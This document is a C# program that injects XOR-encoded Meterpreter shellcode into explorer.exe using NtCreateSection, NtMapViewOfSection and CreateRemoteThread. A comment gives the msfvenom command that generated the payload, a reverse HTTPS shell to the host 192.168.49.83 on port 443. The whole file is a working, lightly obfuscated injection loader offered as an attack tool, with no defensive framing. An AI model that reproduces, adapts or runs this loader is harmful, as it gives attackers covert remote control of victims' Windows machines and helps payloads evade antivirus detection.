using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Inject_Alt
{
    class Program
    {
        // OpenProcess
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
             uint processAccess,
             bool bInheritHandle,
             int processId
        );

        // GetCurrentProcess - kernel32.dll
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentProcess();

        // NtCreateSection
        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        public static extern UInt32 NtCreateSection(
            ref IntPtr section,
            UInt32 desiredAccess,
            IntPtr pAttrs,
            ref long MaxSize,
            uint pageProt,
            uint allocationAttribs,
            IntPtr hFile);

        //  NtMapViewOfSection
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            ref long SectionOffset,
            ref long ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        // NtUnmapViewOfSection
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(
            IntPtr hProc,
            IntPtr baseAddr);

        // NtClose
        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);

        // CreateRemoteThread
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        public static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }

        public static byte[] StringToByteArray(String hex)
        {
            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }


        static int Main(string[] args)
        {
            // Shellcode
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.83 LPORT=443 -f csharp --encrypt xor --encrypt-key A
            byte[] buf = new byte[671] {
0xbd,0x09,0xc2,0xa5,0xb1,0xa9,0x8d,0x41,0x41,0x41,0x00,0x10,0x00,0x11,0x13,
0x09,0x70,0x93,0x24,0x09,0xca,0x13,0x21,0x10,0x17,0x09,0xca,0x13,0x59,0x09,
0xca,0x13,0x61,0x09,0x4e,0xf6,0x0b,0x0b,0x09,0xca,0x33,0x11,0x0c,0x70,0x88,
0x09,0x70,0x81,0xed,0x7d,0x20,0x3d,0x43,0x6d,0x61,0x00,0x80,0x88,0x4c,0x00,
0x40,0x80,0xa3,0xac,0x13,0x00,0x10,0x09,0xca,0x13,0x61,0xca,0x03,0x7d,0x09,
0x40,0x91,0x27,0xc0,0x39,0x59,0x4a,0x43,0x4e,0xc4,0x33,0x41,0x41,0x41,0xca,
0xc1,0xc9,0x41,0x41,0x41,0x09,0xc4,0x81,0x35,0x26,0x09,0x40,0x91,0xca,0x09,
0x59,0x11,0x05,0xca,0x01,0x61,0x08,0x40,0x91,0xa2,0x17,0x0c,0x70,0x88,0x09,
0xbe,0x88,0x00,0xca,0x75,0xc9,0x09,0x40,0x97,0x09,0x70,0x81,0x00,0x80,0x88,
0x4c,0xed,0x00,0x40,0x80,0x79,0xa1,0x34,0xb0,0x0d,0x42,0x0d,0x65,0x49,0x04,
0x78,0x90,0x34,0x99,0x19,0x05,0xca,0x01,0x65,0x08,0x40,0x91,0x27,0x00,0xca,
0x4d,0x09,0x05,0xca,0x01,0x5d,0x08,0x40,0x91,0x00,0xca,0x45,0xc9,0x00,0x19,
0x09,0x40,0x91,0x00,0x19,0x1f,0x18,0x1b,0x00,0x19,0x00,0x18,0x00,0x1b,0x09,
0xc2,0xad,0x61,0x00,0x13,0xbe,0xa1,0x19,0x00,0x18,0x1b,0x09,0xca,0x53,0xa8,
0x0a,0xbe,0xbe,0xbe,0x1c,0x09,0x70,0x9a,0x12,0x08,0xff,0x36,0x28,0x2f,0x28,
0x2f,0x24,0x35,0x41,0x00,0x17,0x09,0xc8,0xa0,0x08,0x86,0x83,0x0d,0x36,0x67,
0x46,0xbe,0x94,0x12,0x12,0x09,0xc8,0xa0,0x12,0x1b,0x0c,0x70,0x81,0x0c,0x70,
0x88,0x12,0x12,0x08,0xfb,0x7b,0x17,0x38,0xe6,0x41,0x41,0x41,0x41,0xbe,0x94,
0xa9,0x4f,0x41,0x41,0x41,0x70,0x78,0x73,0x6f,0x70,0x77,0x79,0x6f,0x75,0x78,
0x6f,0x79,0x72,0x41,0x1b,0x09,0xc8,0x80,0x08,0x86,0x81,0xfa,0x40,0x41,0x41,
0x0c,0x70,0x88,0x12,0x12,0x2b,0x42,0x12,0x08,0xfb,0x16,0xc8,0xde,0x87,0x41,
0x41,0x41,0x41,0xbe,0x94,0xa9,0x37,0x41,0x41,0x41,0x6e,0x36,0x36,0x74,0x17,
0x37,0x02,0x0f,0x1b,0x12,0x30,0x17,0x0e,0x00,0x71,0x79,0x03,0x0d,0x0d,0x36,
0x18,0x29,0x26,0x20,0x32,0x02,0x39,0x04,0x77,0x1e,0x34,0x0c,0x0f,0x29,0x0c,
0x76,0x06,0x20,0x76,0x25,0x31,0x2b,0x11,0x70,0x1e,0x12,0x07,0x71,0x36,0x22,
0x76,0x74,0x37,0x38,0x26,0x24,0x0d,0x24,0x13,0x2f,0x23,0x0c,0x35,0x16,0x17,
0x2a,0x23,0x38,0x00,0x23,0x73,0x78,0x72,0x72,0x2b,0x12,0x28,0x25,0x34,0x15,
0x39,0x17,0x74,0x0c,0x20,0x35,0x24,0x71,0x29,0x2e,0x32,0x31,0x0c,0x74,0x24,
0x29,0x09,0x0c,0x05,0x10,0x13,0x2f,0x05,0x17,0x75,0x0e,0x34,0x79,0x32,0x07,
0x1b,0x14,0x0f,0x25,0x73,0x04,0x34,0x41,0x09,0xc8,0x80,0x12,0x1b,0x00,0x19,
0x0c,0x70,0x88,0x12,0x09,0xf9,0x41,0x73,0xe9,0xc5,0x41,0x41,0x41,0x41,0x11,
0x12,0x12,0x08,0x86,0x83,0xaa,0x14,0x6f,0x7a,0xbe,0x94,0x09,0xc8,0x87,0x2b,
0x4b,0x1e,0x09,0xc8,0xb0,0x2b,0x5e,0x1b,0x13,0x29,0xc1,0x72,0x41,0x41,0x08,
0xc8,0xa1,0x2b,0x45,0x00,0x18,0x08,0xfb,0x34,0x07,0xdf,0xc7,0x41,0x41,0x41,
0x41,0xbe,0x94,0x0c,0x70,0x81,0x12,0x1b,0x09,0xc8,0xb0,0x0c,0x70,0x88,0x0c,
0x70,0x88,0x12,0x12,0x08,0x86,0x83,0x6c,0x47,0x59,0x3a,0xbe,0x94,0xc4,0x81,
0x34,0x5e,0x09,0x86,0x80,0xc9,0x52,0x41,0x41,0x08,0xfb,0x05,0xb1,0x74,0xa1,
0x41,0x41,0x41,0x41,0xbe,0x94,0x09,0xbe,0x8e,0x35,0x43,0xaa,0xeb,0xa9,0x14,
0x41,0x41,0x41,0x12,0x18,0x2b,0x01,0x1b,0x08,0xc8,0x90,0x80,0xa3,0x51,0x08,
0x86,0x81,0x41,0x51,0x41,0x41,0x08,0xfb,0x19,0xe5,0x12,0xa4,0x41,0x41,0x41,
0x41,0xbe,0x94,0x09,0xd2,0x12,0x12,0x09,0xc8,0xa6,0x09,0xc8,0xb0,0x09,0xc8,
0x9b,0x08,0x86,0x81,0x41,0x61,0x41,0x41,0x08,0xc8,0xb8,0x08,0xfb,0x53,0xd7,
0xc8,0xa3,0x41,0x41,0x41,0x41,0xbe,0x94,0x09,0xc2,0x85,0x61,0xc4,0x81,0x35,
0xf3,0x27,0xca,0x46,0x09,0x40,0x82,0xc4,0x81,0x34,0x93,0x19,0x82,0x19,0x2b,
0x41,0x18,0x08,0x86,0x83,0xb1,0xf4,0xe3,0x17,0xbe,0x94 };





            // New array to hold encrypted payload
            byte[] encoded = new byte[buf.Length];

            // Create loop to iterate over the bytes and XOR them
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] ^ 0x41) & 0xFF);
            }

            // Byte array to String
            String hex = ByteArrayToString(encoded);
            Console.WriteLine("HEX: " + hex);

            // String array to bytes
            byte[] unencoded = StringToByteArray(hex);
            
            long buffer_size = unencoded.Length;

            // Get process PID
            var process = Process.GetProcessesByName("explorer")[0];
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, process.Id);

            // Create the section handle.
            IntPtr ptr_section_handle = IntPtr.Zero;
            UInt32 create_section_status = NtCreateSection(
                ref ptr_section_handle,
                0xe,
                IntPtr.Zero,
                ref buffer_size,
                0x40,
                0x08000000,
                IntPtr.Zero
            );

            if (create_section_status != 0 || ptr_section_handle == IntPtr.Zero)
            {
                Console.WriteLine("[!] An error occured while creating the section.");
                return -1;
            }
            Console.WriteLine("[+] The section has been created successfully.");
            Console.WriteLine("[*] ptr_section_handle: 0x" + String.Format("{0:X}", (ptr_section_handle).ToInt64()));

            // Map a view of a section into the virtual address space of the current process.
            long local_section_offset = 0;
            IntPtr ptr_local_section_addr = IntPtr.Zero;
            UInt32 local_map_view_status = NtMapViewOfSection(
                ptr_section_handle,
                GetCurrentProcess(),
                ref ptr_local_section_addr,
                IntPtr.Zero,
                IntPtr.Zero,
                ref local_section_offset,
                ref buffer_size,
                0x2,
                0,
                0x04
            );

            if (local_map_view_status != 0 || ptr_local_section_addr == IntPtr.Zero)
            {
                Console.WriteLine("[!] An error occured while mapping the view within the local section.");
                return -1;
            }
            Console.WriteLine("[+] The local section view's been mapped successfully with PAGE_READWRITE access.");
            Console.WriteLine("[*] ptr_local_section_addr: 0x" + String.Format("{0:X}", (ptr_local_section_addr).ToInt64()));

            // Copy the shellcode into the mapped section.
            Marshal.Copy(unencoded, 0, ptr_local_section_addr, unencoded.Length);

            // Map a view of the section in the virtual address space of the targeted process.
            IntPtr ptr_remote_section_addr = IntPtr.Zero;
            UInt32 remote_map_view_status = NtMapViewOfSection(
                ptr_section_handle,
                hProcess,
                ref ptr_remote_section_addr,
                IntPtr.Zero,
                IntPtr.Zero,
                ref local_section_offset,
                ref buffer_size,
                0x2,
                0,
                0x20
            );

            if (remote_map_view_status != 0 || ptr_remote_section_addr == IntPtr.Zero)
            {
                Console.WriteLine("[!] An error occured while mapping the view within the remote section.");
                return -1;
            }
            Console.WriteLine("[+] The remote section view's been mapped successfully with PAGE_EXECUTE_READ access.");
            Console.WriteLine("[*] ptr_remote_section_addr: 0x" + String.Format("{0:X}", (ptr_remote_section_addr).ToInt64()));

            // Unmap the view of the section from the current process & close the handle.
            NtUnmapViewOfSection(GetCurrentProcess(), ptr_local_section_addr);
            NtClose(ptr_section_handle);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, ptr_remote_section_addr, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("[!] An error occured while creating remote thread.");
                return -1;
            }
            else
            {
                return 0;
            }

        }
    }
}
